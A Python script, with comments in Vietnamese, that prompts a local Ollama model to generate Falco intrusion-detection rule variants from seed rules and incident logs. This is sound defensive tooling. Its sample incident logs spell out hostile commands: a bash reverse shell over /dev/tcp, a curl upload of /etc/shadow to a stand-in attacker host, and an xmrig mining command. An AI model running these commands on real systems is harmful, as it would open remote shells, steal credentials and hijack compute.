"""
ai_rule_generator/generator.py
Giai đoạn 6 — AI Rule Generator (Ollama)

Có 2 chế độ chạy:

1) Thủ công, chỉ định đúng 1 kịch bản (giống cách cũ, nhưng giờ hỗ trợ
   nhiều kịch bản thay vì hardcode 1 cái duy nhất):

     python generator.py --scenario cryptominer
     python generator.py --scenario reverse_shell --n-variants 3

   Nếu Elasticsearch có sẵn sự cố CRITICAL thật của scenario đó (do
   ai_processor sinh ra), generator sẽ DÙNG SỰ CỐ THẬT làm ngữ cảnh
   thay vì dữ liệu mẫu hardcode. Nếu không tìm thấy, sẽ dùng
   sample log mặc định (SAMPLE_INCIDENT_LOGS bên dưới) để vẫn chạy được.

2) Tự động, quét TẤT CẢ scenario có sự cố CRITICAL mới trong Elasticsearch
   mà chưa từng được sinh luật (theo signals-combo), tự chạy sinh luật cho
   từng cái:

     python generator.py --auto
     python generator.py --auto --since 1h     # chỉ quét incident trong 1h gần đây

   Trạng thái "đã xử lý" được lưu ở processed_signals.json để lần chạy sau
   (ví dụ chạy định kỳ bằng cron) không sinh lại luật cho đúng 1 combo cũ.

Luật hợp lệ được APPEND (không ghi đè) vào generated_rules.yaml, có gắn kèm
scenario để dễ review theo nhóm ở bước apply_rules.py.
"""

import argparse
import json
import os
import re
import sys
import time
from pathlib import Path

import requests
import yaml

try:
    from elasticsearch import Elasticsearch
except ImportError:
    Elasticsearch = None

OLLAMA_URL = os.getenv("OLLAMA_URL", "http://localhost:11434/api/generate")
MODEL = os.getenv("OLLAMA_MODEL", "phi3:mini")

ES_HOST = os.getenv("ES_HOST", "http://localhost:9200")
ES_INDEX = "security-incidents"

SEED_RULES_FILE = "seed_rules.yaml"
GENERATED_RULES_FILE = "generated_rules.yaml"
PROCESSED_STATE_FILE = "processed_signals.json"

REQUIRED_FIELDS = {"rule", "desc", "condition", "output", "priority"}

# Dùng khi không có sự cố thật nào trong ES cho scenario đó (ví dụ mới thêm
# scenario, chưa từng xảy ra thật) -> vẫn chạy được để demo/test.
SAMPLE_INCIDENT_LOGS = {
    "cryptominer": (
        "container_id: victim_test_001\n"
        "process: xmrig\n"
        "cmdline: xmrig -o pool.minexmr.com:4444 -u WALLET_ADDRESS -p x\n"
        "network: stratum+tcp://pool.minexmr.com:4444\n"
        "cpu_percent: 95.5\n"
    ),
    "reverse_shell": (
        "container_id: victim_test_002\n"
        "process: bash\n"
        "cmdline: bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n"
    ),
    "ssh_bruteforce": (
        "container_id: victim_test_003\n"
        "process: sshd\n"
        "log: Failed password for root from 1.2.3.4 port 51902 ssh2 (x8 in 30s)\n"
    ),
    "data_exfiltration": (
        "container_id: victim_test_004\n"
        "process: curl\n"
        "cmdline: curl -T /etc/shadow http://attacker.example.com/upload\n"
    ),
}


def load_seed_rules() -> dict:
    if not Path(SEED_RULES_FILE).exists():
        print(f"Không tìm thấy {SEED_RULES_FILE}.")
        sys.exit(1)
    with open(SEED_RULES_FILE, "r", encoding="utf-8") as f:
        return yaml.safe_load(f) or {}


def fetch_latest_real_incident(scenario: str, since: str = "24h"):
    """Lấy sự cố CRITICAL thật gần nhất của scenario này từ Elasticsearch.
    Trả về None nếu không kết nối được ES hoặc không có sự cố nào."""
    if Elasticsearch is None:
        return None
    try:
        es = Elasticsearch(ES_HOST, request_timeout=5)
        resp = es.search(
            index=ES_INDEX,
            size=1,
            sort=[{"@timestamp": {"order": "desc"}}],
            query={
                "bool": {
                    "filter": [
                        {"term": {"scenario": scenario}},
                        {"term": {"label": "CRITICAL"}},
                        {"range": {"@timestamp": {"gte": f"now-{since}"}}},
                    ]
                }
            },
        )
        hits = resp.get("hits", {}).get("hits", [])
        if not hits:
            return None
        return hits[0]["_source"]
    except Exception as e:
        print(f"[ES ERROR] Không đọc được sự cố thật từ Elasticsearch: {e}")
        return None


def fetch_recent_critical_scenarios(since: str = "24h"):
    """Dùng cho --auto: liệt kê các (scenario, signals-combo) đã xảy ra CRITICAL
    gần đây, để biết cần sinh luật cho combo nào."""
    if Elasticsearch is None:
        print("Thiếu thư viện 'elasticsearch'. Cài: pip install elasticsearch --break-system-packages")
        return []
    try:
        es = Elasticsearch(ES_HOST, request_timeout=5)
        resp = es.search(
            index=ES_INDEX,
            size=200,
            sort=[{"@timestamp": {"order": "desc"}}],
            query={
                "bool": {
                    "filter": [
                        {"term": {"label": "CRITICAL"}},
                        {"range": {"@timestamp": {"gte": f"now-{since}"}}},
                    ]
                }
            },
        )
        hits = resp.get("hits", {}).get("hits", [])
        combos = {}
        for h in hits:
            src = h["_source"]
            scenario = src.get("scenario", "unknown")
            signals_key = ",".join(sorted(src.get("signals", [])))
            combos[(scenario, signals_key)] = src
        return list(combos.items())
    except Exception as e:
        print(f"[ES ERROR] Không quét được sự cố gần đây: {e}")
        return []


def incident_to_log_text(incident: dict) -> str:
    return (
        f"container_id: {incident.get('container_id')}\n"
        f"scenario: {incident.get('scenario')}\n"
        f"risk_score: {incident.get('risk_score')}\n"
        f"signals: {incident.get('signals')}\n"
        f"timestamp: {incident.get('@timestamp')}\n"
    )


def load_processed_state() -> dict:
    if Path(PROCESSED_STATE_FILE).exists():
        with open(PROCESSED_STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_processed_state(state: dict) -> None:
    with open(PROCESSED_STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, ensure_ascii=False, indent=2)


def build_prompt(seed_rule: str, incident_log: str, n_variants: int = 3) -> str:
    # Prompt viết bằng tiếng Anh: model nhỏ (phi3:mini) tuân thủ format YAML
    # ổn định hơn hẳn khi hướng dẫn bằng tiếng Anh so với tiếng Việt.
    return f"""You are an expert at writing Falco intrusion-detection rules (YAML format).

Below is a seed rule (SEED RULE) and a real/sample incident log related to it (INCIDENT LOG):

SEED RULE:
{seed_rule}

INCIDENT LOG:
{incident_log}

Generate EXACTLY {n_variants} new Falco rule variants (YAML list format, each item
must have all these fields: rule, desc, condition, output, priority) that would
also catch similar variations of this same attack technique (e.g. different
process names, different ports/destinations, different command-line patterns).

Write the "desc" field in Vietnamese. Everything else (rule, condition, output,
priority, tags) must follow standard Falco YAML syntax.

Return ONLY raw YAML as a list (do NOT wrap it in a "rules:" key), starting
directly with "- rule:". Do NOT include any explanation before or after. If you
use a markdown code fence, use exactly one ```yaml ... ``` block and nothing
outside it.
"""


def call_ollama(prompt: str) -> str:
    payload = {"model": MODEL, "prompt": prompt, "stream": False}
    resp = requests.post(OLLAMA_URL, json=payload, timeout=600)
    resp.raise_for_status()
    return resp.json().get("response", "")


def extract_yaml_block(raw_text: str) -> str:
    match = re.search(r"```(?:yaml)?\s*(.*?)```", raw_text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return raw_text.strip()


def validate_falco_rules(raw_yaml: str):
    cleaned = extract_yaml_block(raw_yaml)
    try:
        parsed = yaml.safe_load(cleaned)
    except yaml.YAMLError as e:
        return [], [f"Lỗi parse YAML tổng thể: {e}"]

    if isinstance(parsed, dict) and "rules" in parsed:
        parsed = parsed["rules"]

    if not isinstance(parsed, list):
        return [], ["Kết quả không phải danh sách rule (list) như yêu cầu"]

    valid_rules, errors = [], []
    for i, rule in enumerate(parsed):
        if not isinstance(rule, dict):
            errors.append(f"Rule #{i}: không phải dạng mapping hợp lệ")
            continue
        missing = REQUIRED_FIELDS - set(rule.keys())
        if missing:
            errors.append(f"Rule #{i} ('{rule.get('rule', '?')}'): thiếu field {missing}")
            continue
        valid_rules.append(rule)

    return valid_rules, errors


def append_generated_rules(scenario: str, rules: list) -> None:
    """Nối thêm luật mới vào generated_rules.yaml, KHÔNG ghi đè luật cũ của
    scenario khác (hoặc luật cũ hơn của cùng scenario)."""
    existing = []
    if Path(GENERATED_RULES_FILE).exists():
        with open(GENERATED_RULES_FILE, "r", encoding="utf-8") as f:
            existing = yaml.safe_load(f) or []
        if not isinstance(existing, list):
            existing = []

    for r in rules:
        r["_source_scenario"] = scenario  # gắn nhãn để apply_rules.py hiển thị theo nhóm

    existing.extend(rules)

    with open(GENERATED_RULES_FILE, "w", encoding="utf-8") as f:
        yaml.safe_dump(existing, f, allow_unicode=True, sort_keys=False)


def generate_for_scenario(scenario: str, seed_rules: dict, n_variants: int, since: str) -> int:
    if scenario not in seed_rules:
        print(f"[LỖI] Không có seed rule cho scenario '{scenario}' trong {SEED_RULES_FILE}.")
        print(f"      Các scenario có sẵn: {list(seed_rules.keys())}")
        return 0

    real_incident = fetch_latest_real_incident(scenario, since=since)
    if real_incident:
        print(f"[{scenario}] Dùng sự cố THẬT từ Elasticsearch làm ngữ cảnh (container={real_incident.get('container_id')}).")
        incident_log = incident_to_log_text(real_incident)
    else:
        print(f"[{scenario}] Không có sự cố thật gần đây trong ES, dùng sample log mặc định.")
        incident_log = SAMPLE_INCIDENT_LOGS.get(
            scenario,
            f"container_id: unknown\nscenario: {scenario}\n(no sample log defined for this scenario)\n",
        )

    prompt = build_prompt(seed_rules[scenario], incident_log, n_variants=n_variants)
    print(f"[{scenario}] Đang gọi Ollama ({MODEL}) sinh luật mới, vui lòng đợi...")

    raw_output = call_ollama(prompt)
    valid_rules, errors = validate_falco_rules(raw_output)

    print(f"[{scenario}] Kết quả validate: {len(valid_rules)} luật hợp lệ, {len(errors)} lỗi")
    for e in errors:
        print(f"  [LỖI] {e}")

    if valid_rules:
        append_generated_rules(scenario, valid_rules)
        print(f"[{scenario}] Đã nối {len(valid_rules)} luật hợp lệ vào {GENERATED_RULES_FILE}")

    return len(valid_rules)


def run_manual(args, seed_rules: dict) -> None:
    generate_for_scenario(args.scenario, seed_rules, args.n_variants, args.since)


def run_auto(args, seed_rules: dict) -> None:
    processed = load_processed_state()
    combos = fetch_recent_critical_scenarios(since=args.since)

    if not combos:
        print("[--auto] Không tìm thấy sự cố CRITICAL nào trong khoảng thời gian đã chọn.")
        return

    new_count = 0
    for (scenario, signals_key), incident in combos:
        state_key = f"{scenario}|{signals_key}"
        if state_key in processed:
            continue  # combo này đã sinh luật trước đó rồi, bỏ qua

        if scenario not in seed_rules:
            print(f"[--auto] Bỏ qua scenario '{scenario}' vì chưa có seed rule trong {SEED_RULES_FILE}.")
            continue

        print(f"\n[--auto] Phát hiện combo MỚI: scenario={scenario} signals={signals_key}")
        n = generate_for_scenario(scenario, seed_rules, args.n_variants, args.since)
        processed[state_key] = {
            "first_seen": incident.get("@timestamp"),
            "processed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "rules_generated": n,
        }
        new_count += 1

    save_processed_state(processed)
    print(f"\n[--auto] Hoàn tất. Đã xử lý {new_count} combo mới. Combo cũ được bỏ qua (xem {PROCESSED_STATE_FILE}).")


def main():
    parser = argparse.ArgumentParser(description="AI Rule Generator (Ollama) cho Falco")
    parser.add_argument("--scenario", help="Tên scenario cần sinh luật (xem seed_rules.yaml)")
    parser.add_argument("--auto", action="store_true",
                         help="Tự quét mọi scenario có sự cố CRITICAL mới trong ES và sinh luật")
    parser.add_argument("--n-variants", type=int, default=2, help="Số biến thể luật muốn sinh mỗi lần")
    parser.add_argument("--since", default="24h",
                         help="Khoảng thời gian quét sự cố trong ES, ví dụ 1h, 24h, 7d")
    args = parser.parse_args()

    seed_rules = load_seed_rules()

    if args.auto:
        run_auto(args, seed_rules)
    elif args.scenario:
        run_manual(args, seed_rules)
    else:
        print("Cần chỉ định --scenario <tên> hoặc --auto. Ví dụ:")
        print("  python generator.py --scenario cryptominer")
        print("  python generator.py --auto")
        print(f"Các scenario có sẵn trong {SEED_RULES_FILE}: {list(seed_rules.keys())}")
        sys.exit(1)


if __name__ == "__main__":
    main()
